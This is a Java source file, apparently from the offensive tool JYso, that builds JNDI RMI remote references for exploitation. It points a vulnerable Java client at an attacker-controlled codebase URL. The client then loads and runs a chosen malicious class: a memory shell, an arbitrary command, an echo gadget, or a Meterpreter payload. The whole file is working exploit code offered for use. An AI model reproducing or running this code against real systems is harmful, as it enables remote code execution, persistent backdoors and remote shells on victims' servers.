package com.qi4l.JYso.controllers.rmi;

import com.qi4l.JYso.controllers.BaseLdapController.ParseResult;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
import com.qi4l.JYso.template.Meterpreter;
import org.fusesource.jansi.Ansi;

import javax.naming.Reference;
import java.net.URL;

import static com.qi4l.JYso.controllers.BaseLdapController.*;

public class Basic {

    public static Reference basic(String base) throws Exception {
        ParseResult result = parseBase(base, "- JNDI RMI Remote Reference Links ");
        String payloadType = result.payloadType;
        String[] params = result.params;

        String className;
        if (payloadType.contains("E-")) {
            String simpleName = suffixAfterDash(payloadType);
            Class<?> echoClass = Class.forName(ClassNameHandler.searchClassByName(simpleName));
            className = echoClass.getName();
        } else if (payloadType.contains("M-")) {
            className = Gadgets.createClassB(suffixAfterDash(payloadType));
        } else if (payloadType.contains("command")) {
            if (params.length == 0) {
                throw new IncorrectParamsException("Missing command parameters.");
            }
            className = Gadgets.createClassB(params[0]);
        } else if (payloadType.contains("msf")) {
            className = Meterpreter.class.getName();
        } else {
            throw new UnSupportedPayloadTypeException("Unsupported payload flag: " + payloadType);
        }

        URL targetUrl = new URL(new URL(Config.codeBase), className.replace('.', '/') + ".class");
        System.out.println(Ansi.ansi().fgBrightBlue().a("  redirecting to " + targetUrl).reset());

        return new Reference("Foo", className, Config.codeBase);
    }
}
